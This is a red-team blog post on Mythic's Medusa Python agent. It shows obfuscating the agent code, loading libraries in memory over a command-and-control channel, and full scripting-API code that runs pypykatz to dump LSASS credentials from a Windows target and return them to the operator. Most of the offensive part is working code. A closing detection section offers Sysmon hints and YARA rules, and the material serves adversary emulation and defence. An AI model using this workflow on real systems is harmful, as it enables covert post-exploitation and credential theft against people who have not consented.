

##
#
https://ajpc500.github.io/c2/In-memory-Python-Modules-With-The-Medusa-Mythic-Agent/
#
https://github.com/MythicAgents
#
https://github.com/its-a-feature/Mythic_External_Agent
#
##


Skip links
Skip to primary navigation
Skip to content
Skip to footer
ajpc500
Home
Talks
Categories
Tags
Toggle search
In-memory Python Modules with the Medusa Mythic Agent
 August 24, 2021   11 minute read

View Code

Home / C2 / In-memory Python Modules with the Medusa Mythic Agent
Alfie Champion
Alfie Champion
All things purple team. Previously MWR, now emulating adversaries in an internal team.

 London, UK
Twitter
GitHub
Medusa is a cross-platform Python agent developed for use with Cody Thomas’s Mythic. It has support for Python 2.7 and 3.8, and makes use of solely built-in libraries for its base agent. Using built-in libraries has obvious benefits in terms of being compatible with the broadest array of operating systems and Python installs. While we can do lots with solely built-in libraries, leveraging third-party libraries can be hugely enabling for post-exploitation activities.

The Python language itself caters readily to dynamic invocation of code, both in terms of on-the-fly execution of Python code through the eval() and exec() functions, and use of functions like setattr() which allows us to add new methods and attributes to existing instances of classes. The Medusa agent implements this concept to load new capabilities into an active agent while maintaining an initial script that is lightweight and provides little indication of what capabilities might be loaded post-execution.

Where this gets really interesting is combining the above with the ability to load third-parties libraries into a running agent as well. At a high-level, this is achieved by downloading a zipped python library into memory, and adding a custom finder object to the sys.meta_path. When a script or function attempts to load a library with an import statement, the custom finder is used to load the library from the in-memory zip.

Notably, this capability is nothing new. A proof-of-concept can be found here from 2015, and Empyre had an implementation that provided the capability to load new modules and execute scripts using these in-memory modules; a feature that Chris Ross also blogged about.

This blog will go through how this in-memory library loading can be operationalised, specifically for Medusa, and will also demonstrate how the ‘leg work’ of importing modules can be scripted using Mythic’s scripting API.

MedusaPermalink
For Medusa, this end-to-end workflow might look as follows:

Create agent script with the load function included.
Once launched, use the load function to add the load_module and load_script functions to the agent.
Use load_module to upload our zipped Python libraries into our agent.
Use load_script to upload and execute a custom script that makes use of the previously imported libraries.
To get us started, we’ll create an agent. We’ll assume you already have Mythic up-and-running and the Medusa agent installed (Medusa is compatible with version 2.2+).

Having selected your chosen platform (we’ll work with a Windows target for this blog), and configured your C2 connection, we’re presented with our build options.

Among these, we can select which Python version we need for our target, all of the functionality described in this blog is supported for Python 2.7 and 3.8.

Build Options

Another configuration item of interest is the XOR and Base64-encode agent code option. As its name suggests, when selected, this Base64-encodes the agent code, XORs it with a randomly-generated value, then wraps the whole thing in an exec() function. An output of this can be seen below.

XOR'd Payload

In the command selection window, we can configure which supported commands are pre-loaded in our agent script. All we really need here is the load command, as this enables us to bring down all the other functionality once executed. An XOR’d agent with just the load function is about 28kb in size.

Command Options

Finishing up with the command selection, we can build our script, download, and execute it (making sure we use the same version of Python we targeted in the build section). All being well, we get a callback.

Initial Callback

As mentioned, once we have our callback, we can use the load function to add the capabilities we need for in-memory module loading and script execution. Namely, load_module and load_script. We can also make use of list_modules and unload_modules to list our loaded modules and unload them again as needed.

Load functions

DNS Resolution with the dnspython LibraryPermalink
With our agent active, and the necessary commands loaded, let’s move onto a simple PoC of the functionality. We’ll take a simple Python 2.7 script that makes use of the dnspython library to resolve a domain name.

import dns.resolver
answers = dns.resolver.query('google.com', 'A')
print "google.com A records:"
for rdata in answers:
    print rdata
For the purposes of this blog, we can simply download dnspython on our own system using pip with the following command:

python -m pip install dnspython
We can then navigate to the install location and view the downloaded files. On a system where Python 2.7 is installed for all users, this would be C:\Python27\Lib\site-packages. To use the library in Medusa, zip the entire directory, i.e. the dns folder itself, not the files within it.

Moving to Mythic, we can use load_module, providing our zip file and the name of the module as it is referenced in an import statement, in this case simply dns.

Loading DNS Module

We can then use the list_modules function to confirm it’s loaded into memory. Running list_modules with no arguments will show the names of all modules loaded, running with a module’s name will list the full zip directory listing, as below:

List DNS Files

Now if we take our Python script from above and run it using the load_script function, we can see if it executes successfully.

DNS Printing to console

Ah, not quite what we want. As we can see above, all output is printed on the target console.

We can alter our script to make use of a built-in Medusa agent function self.sendTaskOutputUpdate(). This takes two arguments, the task_id and the data to send back to Mythic. As our DNS resolution script is ultimately being run in an exec() call in a function in our agent, it has access to this variable. Therefore all we need to do is rewrite our script as follows:

import dns.resolver
answers = dns.resolver.query('google.com', 'A')
output = "google.com A records:\n"
output += "\n".join([str(answer) for answer in answers])
self.sendTaskOutputUpdate(task_id, output)
Running this script through our agent once more, we get the behaviour we want, and our script output is returned to the Mythic server.

DNS Printing to Mythic

Scripting With MythicPermalink
While the above workflow is simple enough for a single library and script, Mythic’s extensive Scripting API allows us to automate the entire process and even retrieve the output of our DNS resolution script.

As a summary, we’ll use a script that will do the following:

Authenticate to Mythic (in our case using username and password, but an API token could be used instead).
Load the required functions, load_module and load_script.
Load the dns module into memory.
Execute our DNS resolution script
Retrieve the output
Below is the Python 3 script that we’ll use for this. It takes the callback ID as an argument so we can easily specify a given agent to execute against. Also note that the DNS resolution script and associated dns module is referenced at the top, these files must be placed alongside the script in the same directory.

from mythic import mythic_rest
import sys, asyncio

callback_id = sys.argv[1]

modules = { "dns": "dns.zip" }
script = "dns_lookup.py"

async def scripting():
    # auth to mythic
    mythic = mythic_rest.Mythic(
        username="USERNAME", 
        password="PASSWORD",
        server_ip="IP_ADDRESS", 
        server_port="7443", 
        ssl=True, 
        global_timeout=-1
    )
    await mythic.login()
    resp = await mythic.set_or_create_apitoken()

    print("\n-------------------------------")
    print("[*] Loading Medusa functions...")
    print("-------------------------------\n")
    # ensure the required Medusa functions are present
    functions = [ "load_module", "load_script" ]
    for function in functions:
        print("[*] Loading {} function".format(function))
        task = mythic_rest.Task(
            callback=callback_id, 
            command=mythic_rest.Command(cmd="load"), 
            params={"command":function}
        )

        # submit the task and wait until it's completed to load the next
        submit = await mythic.create_task(task, return_on="")
        
        if submit.status == "success":
            print("[+] Successfully loaded {} function.\n".format(function))


    print("\n-------------------------------")
    print("[*] Loading required modules...")
    print("-------------------------------\n")
    # read each module zip and submit load_module task
    for module in modules:
        print("[*] Loading {} module in-memory".format(module))
        fc = open(modules[module], "rb").read()

        task = mythic_rest.Task(
            callback=callback_id, 
            command=mythic_rest.Command(cmd="load_module"), 
            params={"module_name":module}, 
            files=[
                mythic_rest.TaskFile(
                    content=fc, 
                    filename=modules[module], 
                    param_name="file")
            ]
        )

        # submit the task and wait until it's completed to load the next
        submit = await mythic.create_task(task, return_on="")
        
        if submit.status == "success":
            print("[+] Successfully loaded {}.\n".format(module))

    # Read the script from local disk
    fc = open(script, "rb").read()
    
    print("-------------------------------")
    print("[*] Executing script...")
    print("-------------------------------\n")
    # create task for executing script
    task = mythic_rest.Task(
        callback=callback_id, 
        command=mythic_rest.Command(cmd="load_script"), 
        params={}, 
        files=[
            mythic_rest.TaskFile(
                content=fc, 
                filename=script, 
                param_name="file")
        ]
    )
    
    # Submit the task and wait for it to complete, then show us the output 
    submit = await mythic.create_task(task, return_on="")
 
    results = await mythic.gather_task_responses(submit.response.id, timeout=-1)
    for result in results:
        print(result.to_json()["response"])


async def main():
    await scripting()

loop = asyncio.get_event_loop()
loop.run_until_complete(main())
Let’s take a fresh Python 2.7 Medusa agent and try out this script.


Great, so now we have our in-memory library loaded, our script being executed, and all output making its way back to Mythic for us to view.

Now, let’s take advantage of the convenience of our automation and take things a little further!

Dumping Credentials from LSASS using the pypykatz LibraryPermalink
To demonstrate the power and versatility that all this dynamic invocation and module loading can provide us, let’s use SkelSec’s awesome pypykatz project to dump credentials from our Windows target’s LSASS process.

We’ll switch to a Python 3.8 Medusa agent for this and we’ll be loading in four dependencies (three, plus the pypykatz library itself):

minikerberos
minidump
asn1crypto
pypykatz
Below is the simply script that will execute pypykatz, targeting all credential types. Note how this script has already been written to make use of the self.sendTaskOutputUpdate() function to return all output to the Mythic server.

from pypykatz.pypykatz import pypykatz
res = pypykatz.go_live(packages=['all'])
self.sendTaskOutputUpdate(task_id, str(res))
Having downloaded and zipped up each of our four libraries, we can reuse our Mythic API script to execute this. Note it’s just the modules dictionary and script string that have changed here, but the full script is provided for completeness.

from mythic import mythic_rest
import sys, asyncio

callback_id = sys.argv[1]

modules = {
    "minikerberos": "minikerberos.zip",
    "minidump": "minidump.zip",
    "asn1crypto": "asn1crypto.zip",
    "pypykatz": "pypykatz.zip",
}
script = "pypykatz_run.py"

async def scripting():
    # auth to mythic
    mythic = mythic_rest.Mythic(
        username="USERNAME", 
        password="PASSWORD",
        server_ip="IP_ADDRESS", 
        server_port="7443", 
        ssl=True, 
        global_timeout=-1
    )
    await mythic.login()
    resp = await mythic.set_or_create_apitoken()

    print("\n-------------------------------")
    print("[*] Loading Medusa functions...")
    print("-------------------------------\n")
    # ensure the required Medusa functions are present
    functions = [ "load_module", "load_script" ]
    for function in functions:
        print("[*] Loading {} function".format(function))
        task = mythic_rest.Task(
            callback=callback_id, 
            command=mythic_rest.Command(cmd="load"), 
            params={"command":function}
        )

        # submit the task and wait until it's completed to load the next
        submit = await mythic.create_task(task, return_on="")
        
        if submit.status == "success":
            print("[+] Successfully loaded {} function.\n".format(function))

    print("\n-------------------------------")
    print("[*] Loading required modules...")
    print("-------------------------------\n")
    # read each module zip and submit load_module task
    for module in modules:
        print("[*] Loading {} module in-memory".format(module))
        fc = open(modules[module], "rb").read()

        task = mythic_rest.Task(
            callback=callback_id, 
            command=mythic_rest.Command(cmd="load_module"), 
            params={"module_name":module}, 
            files=[
                mythic_rest.TaskFile(
                    content=fc, 
                    filename=modules[module], 
                    param_name="file")
            ]
        )

        # submit the task and wait until it's completed to load the next
        submit = await mythic.create_task(task, return_on="")
        
        if submit.status == "success":
            print("[+] Successfully loaded {}.\n".format(module))

    # Read the script from local disk
    fc = open(script, "rb").read()
    
    print("-------------------------------")
    print("[*] Executing script...")
    print("-------------------------------\n")
    # create task for executing script
    task = mythic_rest.Task(
        callback=callback_id, 
        command=mythic_rest.Command(cmd="load_script"), 
        params={}, 
        files=[
            mythic_rest.TaskFile(
                content=fc, 
                filename=script, 
                param_name="file")
        ]
    )
    
    # Submit the task and wait for it to complete, then show us the output 
    submit = await mythic.create_task(task, return_on="")
 
    results = await mythic.gather_task_responses(submit.response.id, timeout=-1)
    for result in results:
        print(result.to_json()["response"])


async def main():
    await scripting()

loop = asyncio.get_event_loop()
loop.run_until_complete(main())
Once again, let’s take a new Medusa agent - a Python 3.8 one this time - and execute our script to load all the dependencies and execute our LSASS credential dumping. It’s worth mentioning, the below video is edited to skip some of the waiting for modules to load. It’s wise to consider how large the libraries are that you’re loading into your agent as they’ll generate notable C2 traffic volume.


And there we have it, we’ve loaded pypykatz and its dependencies into our agent - all over our established C2 channel and all in memory - and dumped credentials from LSASS.

DetectionPermalink
Being cross-platform, detection opportunities naturally vary across operating systems. Considering the specific Windows capabilities shown in this blog, we could use something like Sysmon EID 22 to log the DNS queries, and then our python process opening a handle to LSASS for the credential dumping.

Considering the Medusa payload itself, even with the XOR’d script, once executed the Medusa script sits in-memory in plaintext. We could use a yara rule such the below to scan for key strings, such as those required in the Mythic JSON responses.

rule medusa_mythic_agent {
	meta:
		description = "Medusa Python strings"
		author = "ajpc500"
		date = "2021-08-25"
	strings:
		$s1 = "medusa" 
		$s2 = "get_tasking"
		$s3 = "PayloadUUID"
		$s4 = "KillDate"
		$s5 = "post_response"
		$s6 = "total_chunks"
	condition:
		all of them
}
Medusa Script in Memory

For the in-memory module loading, once uploaded we can see the entire zip sat in memory. We can identify the zip file by its ‘magic bytes’ or file headers, a prefix of \x50\x4b\x03\x04.

Zip file in memory

We could potentially use another yara rule to scan for these zip file magic bytes, such as the below, though this may not scale well in production.

rule in_memory_zip {
	meta:
		description = "Zip file headers"
		author = "ajpc500"
		date = "2021-08-25"
	strings:
		$tokenString1 = { 50 4b 03 04 }
	condition:
		all of them
}
Yara output for Zip file in memory

ConclusionsPermalink
This blog has demonstrated how the concepts of in-memory module loading and dynamic invocation of scripts are applied in the Medusa Mythic agent, across both Python 2.7 and 3.8 versions. While not a novel technique in itself, we’ve seen how Mythic’s extensive scripting API can allow us to streamline this process. Along the way we also saw some of the OPSEC considerations within the Medusa agent, including the ability to Base64 and XOR the agent code, and load new agent functions post-execution to keep the initial script small and not reveal its full capabilities.

The Medusa agent can be found in the MythicAgents repo here and is actively being developed, so pull requests are very welcome!

 Tags: Medusa Mythic Python

 Categories: c2

 Updated: August 24, 2021

 Twitter  Facebook  LinkedInPreviousNext
YOU MAY ALSO ENJOY
Blue Team Con: Going Atomic
 August 30, 2022
 21 minute read

The Strengths and Weaknesses of a Technique-centric Purple Teaming Approach

Targeting Visual Studio Code for macOS: File Discovery and a TCC bypass (kinda)
 March 21, 2022
 10 minute read

Discover a user’s recent Code files and access unsaved edits

Using Cloudflare Workers as Redirectors
 January 25, 2021
 6 minute read

Shellcode Injection using Nim and Syscalls
 January 19, 2021
 6 minute read

 FEED
© 2022 ajpc500. Powered by Jekyll & Minimal Mistakes.
